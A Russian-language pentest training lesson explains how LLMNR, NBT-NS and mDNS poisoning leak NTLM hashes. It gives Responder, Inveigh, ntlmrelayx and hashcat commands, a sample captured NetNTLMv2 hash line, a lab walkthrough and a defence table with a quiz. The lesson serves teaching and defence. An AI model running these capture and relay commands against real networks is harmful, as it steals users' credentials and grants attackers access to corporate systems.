---
id: network-netbios-llmnr
title: "NetBIOS, LLMNR и NBT-NS: poisoning и захват учётных данных"
category: network
parent: network-mitm
difficulty: medium
order: 3
tags: [network, netbios, llmnr, nbt-ns, mdns, responder, ntlm, smb]
prerequisites: [network-mitm, network-ntlm-relay]
useful_for:
  - "Пентест внутренних сетей"
  - "Red team / AD-атаки"
  - "Защита корпоративной ЛВС"
estimated_minutes: 40
summary: "Как протоколы разрешения имён (NBT-NS, LLMNR, mDNS) приводят к утечке NTLM-хэшей: Responder/Inveigh, разбор захвата, релеинг и защита."
---

Когда пользователь опечатывается в имени хоста или запрашивает несуществующий ресурс, Windows по умолчанию пытается разрешить имя несколькими способами, и часть из них — **широковещательные, без аутентификации**. Атакующий в той же сети просто отвечает «это я», и жертва добровольно отправляет ему свои NTLM-креденшелы. Это один из самых результативных векторов в корпоративных сетях и обязательная тема для внутреннего пентеста.

## Протоколы разрешения имён

Порядок разрешения в Windows (упрощённо): кэш → hosts → DNS → **LLMNR** → **NBT-NS** → (mDNS для некоторых сервисов). Из них:

- **NBT-NS (NetBIOS Name Service)** — UDP/137. Плоский широковещательный протокол имён из эпохи NetBIOS. Если DNS не разрешил имя, узел кричит «Кто такой FILESRV?» в broadcast.
- **LLMNR (Link-Local Multicast Name Resolution)** — UDP/5355, multicast `224.0.0.252` / `ff02::1:3`. Задуман как замена NBT-NS, но так же неаутентифицирован.
- **mDNS** — UDP/5353, multicast `224.0.0.251`. Используется для `.local`, принтеров, Bonjour, части Windows-сервисов.

Все три **не имеют аутентификации**: кто первый ответит — того и слушают.

| Протокол | Порт | Транспорт | Аутентификация |
|---|---|---|---|
| NBT-NS | 137 | UDP broadcast | Нет |
| LLMNR | 5355 | UDP multicast | Нет |
| mDNS | 5353 | UDP multicast | Нет |
| DNS | 53 | UDP/TCP | Нет (но иерархия) |

## Механика poisoning

Атакующий слушает широковещательные запросы. Увидев запрос на разрешение имени, он отвечает: «я — FILESRV, и мой IP 10.0.0.66». Жертва устанавливает соединение с атакующим (SMB/HTTP), и в процессе **NTLM-аутентификации** отправляет `NTLMSSP_AUTH` с `NetNTLMv1`/`NetNTLMv2`-хэшем (или, если настроено, с NTLMv1 — легко ломается). Атакующий сохраняет хэш, а иногда и сам релеит его на другой хост.

## Инструменты

- **Responder** — классика: слушает LLMNR/NBT-NS/mDNS, отвечает, собирает хэши.
- **Inveigh** — то же на PowerShell/C# (Windows), плюс спуфинг DNS/HTTP.
- **ntlmrelayx (impacket)** — релеинг собранных аутентификаций на целевые хосты.
- **mitm6** — IPv6-вариант для DHCPv6/RA + WPAD-атак.
- **Pretender** — современная альтернатива на Go.
- **hashcat** — офлайн-взлом собранных NetNTLM-хэшей.

```bash
# Responder: анализ без отравления
sudo responder -I eth0 -A
# Полный режим poisoning (сбор хэшей)
sudo responder -I eth0 -wv
# Inveigh (PowerShell)
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -LLMNR Y
```

## Разобранный пример: захват NetNTLM-хэша

1. Включаем Responder в режиме poisoning:
   ```bash
   sudo responder -I eth0 -wv
   ```
2. На машине-жертве пользователь пытается открыть `\\FILESRV\share` (или просто опечатывается в проводнике). DNS не находит имя → LLMNR-запрос в multicast.
3. Responder отвечает и показывает:
   ```
   [LLMNR]  Poisoned answer sent to 10.0.0.9 for name FILESRV
   [SMB] NTLMv2-SSP Client   : 10.0.0.9
   [SMB] NTLMv2-SSP Username : CORP\j.doe
   [SMB] NTLMv2-SSP Hash     : j.doe::CORP:1122334455667788:...:0101000000...
   ```
4. Сохраняем хэш в файл и пробуем офлайн-взлом:
   ```bash
   hashcat -m 5600 hashes.txt rockyou.txt -r best64.rule
   ```
5. Если взлом не удался, пробуем **релеинг**: поднимаем `ntlmrelayx` и ждём аутентификацию от привилегированного пользователя.
   ```bash
   sudo impacket-ntlmrelayx -tf targets.txt -smb2support
   ```

## Релеинг и его условия

Собранную аутентификацию можно не только ломать, но и **релеить** (переслать) на другой хост, войдя от имени жертвы. Условия успеха:

- на цели **выключена** обязательная SMB signing (для SMB) или LDAP signing/channel binding (для LDAP);
- целевой сервис не тот же, откуда пришла аутентификация (нельзя релеить на себя);
- у жертвы достаточно прав на цель.

Связка `Responder + ntlmrelayx` (или `mitm6` для IPv6) — стандарт получения первого доступа в AD без пароля. Подробнее — в `network-ntlm-relay`.

## Защита

| Мера | Против чего |
|---|---|
| Отключить LLMNR (`Turn off multicast name resolution`) | LLMNR poisoning |
| Отключить NBT-NS (`NetBIOS over TCP/IP = Disabled`) | NBT-NS poisoning |
| Обязательная SMB signing | Релеинг SMB |
| LDAP signing + channel binding | Релеинг LDAP |
| Extended Protection for Authentication (EPA) | Релеинг HTTP/S |
| Сегментация + NAC | Позиция атакующего в ЛВС |
| Сетевая аутентификация NTLMv2, запрет NTLMv1 | Быстрый взлом |

Главное — **отключить LLMNR и NBT-NS** через групповую политику: это убирает сам вектор. Обязательная SMB signing блокирует релеинг даже при poisoning.

## Частые ошибки и подводные камни

- **Запускать Responder и ntlmrelayx одновременно на одном интерфейсе** — они конфликтуют за порты; либо используйте `Responder -A` (analysis) вместе с relay, либо разделяйте роли.
- **Ожидать NTLMv2 всегда.** В старых системах может быть NTLMv1 (легко ломается) или Kerberos (если имя разрешается по DNS).
- **Игнорировать IPv6.** Даже при выключенном IPv6-стеке на хосте Windows часто активен IPv6 по умолчанию — `mitm6` этим пользуется.
- **Релеить на хост-источник.** Это не сработает; нужен отдельный target.
- **Забывать про SMB signing.** Без проверки signing вы релеите впустую.

## Что дальше / решение

Комбинация `network-ntlm-relay` + `network-wpad-proxy` + `mitm6` даёт полный набор для получения первого доступа в Windows-сети. Дальше — AD-энумерация (`playbook-ad`), Kerberoasting и delegation. Для защиты внедрите GPO: отключите LLMNR/NBT-NS, включите SMB/LDAP signing и EPA, ограничьте NTLM. Для CTF потренируйтесь поднимать Responder в изолированной лабе и ломать собранный хэш через hashcat.

## Справочная таблица

| Инструмент | Роль |
|---|---|
| Responder | LLMNR/NBT-NS/mDNS poisoning, сбор хэшей |
| Inveigh | То же, на Windows |
| ntlmrelayx | Релеинг NTLM |
| mitm6 | IPv6 DHCPv6/RA + WPAD |
| hashcat -m 5600 | Взлом NetNTLMv2 |

| Хэш | hashcat mode |
|---|---|
| NetNTLMv1 | 5500 |
| NetNTLMv2 | 5600 |

## Responder в деталях

Responder — не монолит, а набор «серверов» для разных протоколов. Полезные опции:

- `-I eth0` — интерфейс;
- `-w` — включить WPAD-сервер;
- `-v` — подробный вывод;
- `-A` — режим анализа (только слушать, не отравлять) — безопасно для разведки;
- `-F` — принудительно отвечать на NBT-NS/LLMNR даже при наличии легитимного ответа;
- `-d` — включить DHCP-ответы;
- `-r` — включить NBT-NS/LLMNR, но не отвечать (анализ).

Конфиг `Responder.conf` управляет тем, какие серверы включены (`SMB`, `HTTP`, `LDAP`, `WPAD`, `DNS`), а также флагом `Challenge` (для NTLMv1 можно поставить `1122334455667788` — известный челлендж, облегчающий взлом). Логи пишутся в `logs/` по протоколам. Отдельно важен `--lm` (даунгрейд на LM/NTLMv1), но в современных сетях он редко срабатывает.

```bash
# Безопасная разведка: только слушать
sudo responder -I eth0 -A
# Полный набор с WPAD
sudo responder -I eth0 -wv
```

## Практическая лаборатория: полный цикл

1. Поднимите изолированную сеть (NAT без выхода наружу) с Windows-жертвой и Linux-атакующим.
2. Запустите `Responder -I eth0 -wv` и убедитесь, что он слушает LLMNR/NBT-NS.
3. На жертве откройте проводник и введите `\\nonexistent\share`.
4. В логах Responder появится `NTLMv2-SSP Hash`. Скопируйте строку в `hash.txt`.
5. Проверьте `hashcat -m 5600 hash.txt rockyou.txt --force` в лабораторных целях.
6. Включите GPO «Turn off multicast name resolution» и повторите — запрос LLMNR исчезнет, хэш не соберётся.
7. Теперь попробуйте релеинг: `ntlmrelayx -tf targets.txt -smb2support` и повторите шаг 3. Если на цели выключен SMB signing — получите доступ.

Такой цикл закрывает и атаку, и защиту, и даёт материал для отчёта.

## Квиз

```quiz
- question: "Почему LLMNR-запросы уязвимы к poisoning?"
  options:
    - "Они шифруются слабым ключом"
    - "Они широковещательные и не аутентифицируют ответы"
    - "Они используют TCP"
    - "Они требуют пароль"
  answer: 1
  explanation: "LLMNR не имеет аутентификации: кто первый ответит, того и слушают."
- question: "Какой инструмент классически собирает NTLM-хэши через LLMNR/NBT-NS poisoning?"
  options:
    - "nmap"
    - "Responder"
    - "Wireshark"
    - "hydra"
  answer: 1
  explanation: "Responder слушает широковещательные запросы и собирает NetNTLM-хэши."
- question: "Какое условие нужно для успешного релеинга NTLM на SMB?"
  options:
    - "Включённая SMB signing"
    - "Выключенная обязательная SMB signing"
    - "Наличие Kerberos-тикета"
    - "Открытый порт 3389"
  answer: 1
  explanation: "Обязательная SMB signing блокирует релеинг; при её отсутствии релеинг возможен."
- question: "Какой режим hashcat ломает NetNTLMv2?"
  options:
    - "1000"
    - "5500"
    - "5600"
    - "13100"
  answer: 2
  explanation: "NetNTLMv2 — режим 5600, NetNTLMv1 — 5500."
- question: "Какая мера лучше всего устраняет сам вектор LLMNR/NBT-NS poisoning?"
  options:
    - "Антивирус"
    - "Отключение LLMNR и NetBIOS over TCP/IP через GPO"
    - "Смена пароля администратора"
    - "Включение IPv6"
  answer: 1
  explanation: "Отключение широковещательных протоколов разрешения имён убирает возможность poisoning."
```

## Где пригодится

- **Пентест/red team:** получение первых NTLM-хэшей в корпоративной сети без пароля.
- **Работа/SOC:** детект poisoning по аномальным ответам на LLMNR/NBT-NS.
- **CTF:** задачи на разбор дампа с NTLM-аутентификацией.
- **Сертификации:** OSCP/CRTP/OSEP — внутренние сетевые атаки.
